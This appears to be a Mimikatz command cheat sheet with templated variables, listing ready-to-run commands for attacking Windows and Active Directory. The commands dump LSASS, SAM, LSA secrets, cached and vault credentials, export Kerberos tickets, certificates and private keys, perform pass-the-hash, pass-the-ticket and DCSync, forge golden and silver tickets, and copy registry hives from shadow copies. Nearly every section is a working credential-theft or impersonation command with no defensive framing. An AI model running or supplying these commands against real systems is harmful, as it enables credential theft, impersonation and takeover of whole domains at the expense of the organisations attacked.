# Mimikatz

## mimikatz

### Logon passwords

Dump cleartext passwords, NT hashes, and Kerberos keys from LSASS for everyone currently logged on. Requires SeDebugPrivilege.

```sh title:"Dump LSASS creds via sekurlsa::logonpasswords"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
<!-- cheat -->

### Logon passwords and SAM

Dump LSASS credentials and local SAM hashes.

```sh title:"Dump LSASS creds and local SAM hashes"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit
```
<!-- cheat -->

### Export tickets from LSASS

Pull every Kerberos ticket out of LSASS and write `.kirbi` files to the current directory.

```sh title:"Export every ticket from LSASS to .kirbi files"
mimikatz.exe "sekurlsa::tickets /export" exit
```
<!-- cheat -->

### Pass-the-hash

Spawn a new process whose token uses the supplied NT hash for outbound auth. Classic PtH primitive.

```sh title:"Spawn cmd.exe with provided NT hash for outbound auth"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:cmd" exit
```
<!-- cheat
var user
var domain
var hash
-->

### List and export tickets

List MSV tickets from the current logon session and export them.

```sh title:"List + export current session Kerberos tickets"
mimikatz.exe "kerberos::list /export" exit
```
<!-- cheat -->

### Pass-the-ticket

Inject a `.kirbi` ticket into the current logon session for impersonation.

```sh title:"Inject .kirbi ticket into current session for impersonation"
mimikatz.exe "kerberos::ptt c:\$ticket_file.kirbi" exit
```
<!-- cheat
var ticket_file
-->

### Forge golden ticket

Forge a TGT signed by the krbtgt hash and save it to a `.kirbi` for later import.

```sh title:"Forge golden TGT signed by krbtgt, save as .kirbi"
mimikatz.exe "kerberos::golden /admin:$target_user /domain:$domain /sid:$domain_sid /krbtgt:$krbtgt_hash /ticket:$ticket_file.kirbi" exit
```
<!-- cheat
var target_user
var domain
var domain_sid
var krbtgt_hash
var ticket_file
-->

### CAPI certificates

List certificates stored in the legacy CryptoAPI store. Useful for finding exportable client certs.

```sh title:"Enumerate CryptoAPI cert store entries"
mimikatz.exe "crypto::capi" exit
```
<!-- cheat -->

### CNG certificates

Same enumeration for the modern CNG (Cryptography Next Generation) store.

```sh title:"Enumerate CNG cert store entries"
mimikatz.exe "crypto::cng" exit
```
<!-- cheat -->

### Export user certs

Export all certs from the current user's store to disk. PFX with empty password by default.

```sh title:"Export current user certs to PFX on disk"
mimikatz.exe "crypto::certificates /export" exit
```
<!-- cheat -->

### Export machine certs

Same export targeted at the LOCAL_MACHINE store. Often holds DC/EFS/NPS server certs.

```sh title:"Export machine cert store (DC/EFS/NPS server certs)"
mimikatz.exe "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE" exit
```
<!-- cheat -->

### Export keys

Export private keys associated with current-user certs.

```sh title:"Export private keys for current-user certs"
mimikatz.exe "crypto::keys /export" exit
```
<!-- cheat -->

### Export machine keys

Export private keys from the machine store; pair with the machine cert export.

```sh title:"Export machine private keys, pair with machine certs"
mimikatz.exe "crypto::keys /machine /export" exit
```
<!-- cheat -->

### Vault credentials

Dump Windows Credential Manager (Vault) entries. Pulls saved RDP, browser, and app passwords for the current user.

```sh title:"Dump Credential Manager (Vault) saved creds"
mimikatz.exe "vault::cred" exit
```
<!-- cheat -->

### Vault list

List Vault entries without pulling the cleartext (lighter footprint).

```sh title:"List Vault entries without dumping cleartext"
mimikatz.exe "vault::list" exit
```
<!-- cheat -->

### Elevate to SYSTEM

Steal a SYSTEM token. Required before lsadump::sam / lsadump::secrets.

```sh title:"Steal SYSTEM token, required before lsadump::sam"
mimikatz.exe "token::elevate" exit
```
<!-- cheat -->

### Dump SAM hashes

Dump local account NT hashes from the SAM hive. Needs SYSTEM via token::elevate.

```sh title:"Dump local SAM NT hashes (needs SYSTEM)"
mimikatz.exe "lsadump::sam" exit
```
<!-- cheat -->

### SAM from copied hives

Dump SAM hashes from copied registry hives.

```cmd title:"Dump SAM hashes from copied hives"
mimikatz.exe "lsadump::sam /system:$system_hive /sam:$sam_hive" exit
```
<!-- cheat
var system_hive
var sam_hive
-->

### LSASS minidump

Read credentials from a captured LSASS dump.

```sh title:"Read credentials from LSASS minidump"
mimikatz.exe "privilege::debug" "sekurlsa::minidump $lsass_dump" "sekurlsa::logonpasswords" exit
```
<!-- cheat
var lsass_dump
-->

### Dump LSA secrets

Dump LSA secrets (service account passwords, DPAPI keys, machine account password).

```sh title:"Dump LSA secrets (service / DPAPI / machine pwd)"
mimikatz.exe "lsadump::secrets" exit
```
<!-- cheat -->

### Dump cached logons

Dump MSCACHEv2 hashes for previously logged-on domain users (offline crack only).

```sh title:"Dump MSCACHEv2 cached domain logon hashes"
mimikatz.exe "lsadump::cache" exit
```
<!-- cheat -->

### Revert token

Drop the impersonated SYSTEM token and return to the original user.

```sh title:"Drop stolen token and return to original user"
mimikatz.exe "token::revert" exit
```
<!-- cheat -->

### DCSync krbtgt

Pull the krbtgt hash via DRSUAPI replication. Requires DS-Replication-Get-Changes / -All. Output enables golden ticket forging.

```sh title:"DRSUAPI replicate krbtgt hash for golden tickets"
mimikatz.exe "lsadump::dcsync /domain:$domain /user:$domain\administrator" exit
```
<!-- cheat
var domain
-->

### DCSync user

Pull hashes for a specific user via DRSUAPI replication.

```sh title:"DCSync a specific domain user"
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$domain /user:$target_user" exit
```
<!-- cheat
var domain
var target_user
-->

### Golden ticket pass-the-ticket

Forge a golden TGT and inject it into the current session in one step (`/ptt`).

```sh title:"Forge golden TGT and inject into session in one step"
mimikatz.exe "kerberos::golden /domain:$domain /user:Administrator /sid:$domain_sid /rc4:$rc4_hash /ptt" exit
```
<!-- cheat
var domain
var domain_sid
var rc4_hash
-->

### Golden ticket extra SID

Forge and inject a golden ticket with an extra SID for forest trust abuse.

```sh title:"Forge golden ticket with extra SID"
mimikatz.exe "kerberos::golden /user:$user /domain:$domain /sid:$child_sid /krbtgt:$krbtgt_hash /sids:$parent_sid-519 /ptt" exit
```
<!-- cheat
var user
var domain
var child_sid
var krbtgt_hash
var parent_sid
-->

### Pass-the-hash RDP

Spawn Restricted Admin RDP with a supplied NT hash.

```sh title:"Pass-the-hash into Restricted Admin RDP"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:\"mstsc.exe /restrictedadmin\"" exit
```
<!-- cheat
var user
var domain
var hash
-->

### Pass-the-hash PowerShell

Spawn PowerShell with a supplied NT hash for outbound authentication.

```sh title:"Pass-the-hash into PowerShell"
mimikatz.exe "sekurlsa::pth /user:$user /domain:$domain /ntlm:$hash /run:powershell" exit
```
<!-- cheat
var user
var domain
var hash
-->

## Shadow copies

### SAM from shadow copy

Dump SAM from registry hives in a volume shadow copy.

```sh title:"Dump SAM from shadow copy hives"
mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" exit
```
<!-- cheat -->

### LSA secrets from shadow copy

Dump LSA secrets from registry hives in a volume shadow copy.

```sh title:"Dump LSA secrets from shadow copy hives"
mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" exit
```
<!-- cheat -->

### Copy shadow hives

Copy SYSTEM, SECURITY, and SAM hives from a volume shadow copy to the current desktop.

```powershell title:"Copy shadow copy registry hives to desktop"
powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.hiv');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.hiv')"
```
<!-- cheat -->

### Forge silver ticket

Forge a CIFS silver ticket targeting one host using its machine account RC4. Bypasses the KDC entirely.

```sh title:"Forge CIFS silver ticket for one host using machine RC4"
mimikatz.exe "kerberos::golden /domain:$domain /user:Administrator /sid:$domain_sid /rc4:$rc4_hash /target:$target /service:cifs /ticket:$ticket_file.kirbi" exit
```
<!-- cheat
var domain
var domain_sid
var rc4_hash
var target
var ticket_file
-->
